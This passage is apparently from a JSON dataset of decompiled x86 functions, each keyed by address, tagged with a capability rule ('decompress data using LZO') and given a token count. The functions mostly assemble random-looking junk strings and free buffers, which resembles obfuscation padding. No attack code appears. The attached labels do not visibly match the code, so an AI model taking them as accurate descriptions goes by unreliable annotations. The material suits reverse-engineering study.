        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00401ee2(uint *param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c1f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    pcStack136 = \"ksimirnlrjhkjvohhffhmyfskmodshgcdqvdlcugowiwajvbsxvyjihatvjhjfpznqiaqvcypsbprrdivolktxyzcnqn\";\n    auStack144[0] = 0x5c;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x31, iStack60, \"xvykfntxjbzqbdjfazrscsqpgsfmujwrzyezmbcwaestbodwg\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x5c, uStack84, \n                 \"ksimirnlrjhkjvohhffhmyfskmodshgcdqvdlcugowiwajvbsxvyjihatvjhjfpznqiaqvcypsbprrdivolktxyzcnqn\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x5c, uStack36, \n                 \"ksimirnlrjhkjvohhffhmyfskmodshgcdqvdlcugowiwajvbsxvyjihatvjhjfpznqiaqvcypsbprrdivolktxyzcnqn\");\n    if (uStack64 < 0x10) {\ncode_r0x00424e87:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00425074;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 7;\n        fcn.00402f72(0x5c, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \n                     \"ksimirnlrjhkjvohhffhmyfskmodshgcdqvdlcugowiwajvbsxvyjihatvjhjfpznqiaqvcypsbprrdivolktxyzcnqn\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 8;\n        fcn.00402f72(0x5c, uStack36, \n                     \"ksimirnlrjhkjvohhffhmyfskmodshgcdqvdlcugowiwajvbsxvyjihatvjhjfpznqiaqvcypsbprrdivolktxyzcnqn\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x00425080;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x0042508c;\n            fcn.00401a32(iVar3);\n        }\n        param_1[5] = 0xf;\n        param_1[4] = 0xb;\n        *param_1 = 0x7161707a;\n        param_1[1] = 0x6d6b6971;\n        *(param_1 + 7) = 0x7778796d;\n        *(param_1 + 0xb) = 0;\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x00425098;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack112) {\n            iVar3 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar3 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar3))\n            goto code_r0x004250a4;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x00424e7b:\n        fcn.00401a32(uVar2);\n        goto code_r0x00424e87;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x00424e7b;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00425074:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00425080:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042508c:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00425098:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x004250a4:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1834
    },
    "00401f0f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00401f0f(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ca40;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"ifcbkzziynjhqiwlywtcnpqvgirrvrrgunpksuzkcndziceuvulastklqbydkieolbaaeekcgbwck\";\n    auStack120[0] = 0x4d;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x36, iStack84, \"bsiooifpcsovmluhhhsvhgkvnqrfibqknmfrodwmwcxfmxtevtkcjl\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x42, uStack36, \"vndamrhrbvtcapycqgdnqrwrgdvjzbjdvkxeikgcwgivicwnpzbvktinttvzphlnmx\");\n    if (uStack64 < 0x10) {\ncode_r0x0043e1f3:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x0043e284;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack88) {\n            iVar1 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar1 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar1))\n            goto code_r0x0043e290;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x54274c;\n    }\n    iVar1 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar1 = *(iStack84 + -4),  (iStack84 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043e1f3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043e284:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043e290:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 902
    },
    "00401f3c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00401f3c(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c020;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x42);\n    if (uStack40 < 0x10) {\ncode_r0x0041f7f9:\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x0041f897;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar2 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) goto code_r0x0041f8a3;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x7e9e;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0041f7f9;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0041f897:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0041f8a3:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 684
    },
    "00401fc8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00401fc8(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000018;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    ushort uStack48;\n    uchar uStack46;\n    uint uStack44;\n    uint uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44c870;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 5;\n    pcStack160 = \"uwkwohgrpnlmqesraealkahjkhkpuybmsxsdtwhvkyhpqbifpxpcjzlmbeqxdbllc\";\n    auStack168[0] = 0x41;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x5f, uStack60, \n                 \"uajnxjngmdldffkxtsbmmzoyjxlkgedrhysbhfpkhxpwhpnonmbwujckoorgsnjkegtjmospfvponstraocizjsjnmlxekc\");\n    uStack40 = 0xf;\n    uStack44 = 0xe;\n    uStack60 = 0x68686d67;\n    uStack56 = 0x68766669;\n    uStack52 = 0x6b656774;\n    uStack48 = 0x706a;\n    uStack46 = 0;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x41, iStack108, \"uwkwohgrpnlmqesraealkahjkhkpuybmsxsdtwhvkyhpqbifpxpcjzlmbeqxdbllc\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x41, uStack36, \"uwkwohgrpnlmqesraealkahjkhkpuybmsxsdtwhvkyhpqbifpxpcjzlmbeqxdbllc\");\n    if (uStack88 < 0x10) {\ncode_r0x0043928a:\n        if (0xf < uStack112) {\n            iVar1 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar1 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar1))\n            goto code_r0x0043939e;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x004393aa;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack136) {\n            iVar1 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar1 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar1))\n            goto code_r0x004393b6;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x004393c2;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542584;\n    }\n    iVar1 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar1 = *(iStack108 + -4),  (iStack108 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043928a;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043939e:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004393aa:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004393b6:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x004393c2:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 1378
    },
    "00401ffa": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00401ffa(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44c2e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 6;\n    pcStack136 = \"kxhzyhwhiebcaxcjcirziyzqhxp\";\n    auStack144[0] = 0x1b;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x49, iStack60, \"ebovzqxhehlsxrohakkqofbdjrcgqawskokzllpxhaxpuiyznbtbozgiqomsmyjggfyrainvy\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x1b, iStack108, \"kxhzyhwhiebcaxcjcirziyzqhxp\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x1b, uStack36, \"kxhzyhwhiebcaxcjcirziyzqhxp\");\n    if (uStack88 < 0x10) {\ncode_r0x00427da1:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x00427ef9;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x00427f05;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack112) {\n            iVar1 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar1 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar1))\n            goto code_r0x00427f11;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x00427f1d;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar1 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar1 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar1)) goto code_r0x00427f29;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x5420d4;\n    }\n    iVar1 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar1 = *(iStack108 + -4),  (iStack108 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00427da1;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00427ef9:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00427f05:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00427f11:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00427f1d:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00427f29:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 1356
    },
    "0040205e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.0040205e(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c3d0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    pcStack88 = \"avnzlckxwkguqfiorujzqcicamqhfzsjwwnssjmexhfrimglrywgbfvvzzcwplzodtqnepuykpezyoh\";\n    auStack96[0] = 0x4f;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x58, uStack36, \n                 \"oechxanviwpvpwifkckrivqamyaaqulrhkxgzjtexaqvvxycxvvnwfvrmsenqtarcbmlfkomdptepccvuxpagfag\");\n    if (0xf < uStack40) {\n        iVar1 = iStack60;\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0042aba1;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < uStack64) {\n        iVar1 = iStack84;\n        if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1)) {\ncode_r0x0042aba1:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fcn.00403a76();\n            return;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return;\n}\n",
        "token_count": 639
    },
    "00402149": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402149(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff20;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c470;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    pcStack160 = \"onaybqaazpokxbeagfamoqfjnezbpufxuylxnepreezlqpoldvdxblgdrjwdkmt\";\n    auStack168[0] = 0x3f;\n    fcn.00402f72();\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x44, iStack108, \"oojkeldsnvlzrvboctaobundprueckxjsvwsgjdunfbkjjhqlsdnxnekvqgmmvepkryi\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x5c, iStack60, \n                 \"gqwznsqmwsloqlgnecxisiobjxogrjnvdqhgvvivfauefnitncnoriogfhrlzddhuzuivokxwlysfpingaprxggihffz\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x5c, uStack84, \n                 \"gqwznsqmwsloqlgnecxisiobjxogrjnvdqhgvvivfauefnitncnoriogfhrlzddhuzuivokxwlysfpingaprxggihffz\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x5c, uStack36, \n                 \"gqwznsqmwsloqlgnecxisiobjxogrjnvdqhgvvivfauefnitncnoriogfhrlzddhuzuivokxwlysfpingaprxggihffz\");\n    if (uStack64 < 0x10) {\ncode_r0x0042d187:\n        if (0xf < uStack40) {\n            in_stack_ffffff20 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff20) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0042d389;\n                in_stack_ffffff20 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x44, in_stack_ffffff20 & 0xffffff00 | uStack84 & 0xff, \n                     \"oojkeldsnvlzrvboctaobundprueckxjsvwsgjdunfbkjjhqlsdnxnekvqgmmvepkryi\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x44, uStack36, \"oojkeldsnvlzrvboctaobundprueckxjsvwsgjdunfbkjjhqlsdnxnekvqgmmvepkryi\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x0042d395;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042d3a1;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0042d3ad;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x0042d3b9;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x0042d3c5;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    in_stack_ffffff20 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff20 < 0x1000) {\ncode_r0x0042d17b:\n        fcn.00401a32(uVar1);\n        goto code_r0x0042d187;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff20 = uStack64 + 0x24;\n        goto code_r0x0042d17b;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042d389:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042d395:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042d3a1:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042d3ad:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0042d3b9:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0042d3c5:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1953
    },
    "004021bc": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.004021bc(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c370;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x1a);\n    if (uStack40 < 0x10) {\ncode_r0x004296b6:\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x00429758;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000003c) {\n            iVar2 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar2 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar2)) goto code_r0x00429764;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004296b6;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00429758:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00429764:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 679
    },
    "004022c5": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
